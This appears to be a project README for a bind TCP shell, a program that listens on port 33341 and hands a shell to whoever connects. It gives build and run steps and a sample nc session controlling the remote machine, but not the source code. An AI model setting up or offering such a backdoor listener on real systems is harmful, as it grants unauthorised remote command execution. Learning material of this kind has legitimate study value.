# Bind TCP Shell
The programm will listen on port 33341 for inbound connections. <br>
When it receives a connection, it will make a execve syscall to get a shell on the remote machine and redirect to descriptors of the programm to our socket <br>
To change the port, change the constant PORT on reverse_tcp_shell.h file. <br>

# How to execute
make <br>
./bind_shell <br>

# Example on remote machine
./bind_shell <br>
Waiting connections on 33341 port <br>
Connect received from 192.168.1.110 on port 44494 <br>

# Example on local machine 
nc -v 192.168.1.200 33341 <br>
Ncat: Version 7.50 ( https://nmap.org/ncat ) <br>
Ncat: Connected to 192.168.1.200:33341. <br>
echo 'test' <br>
test <br>

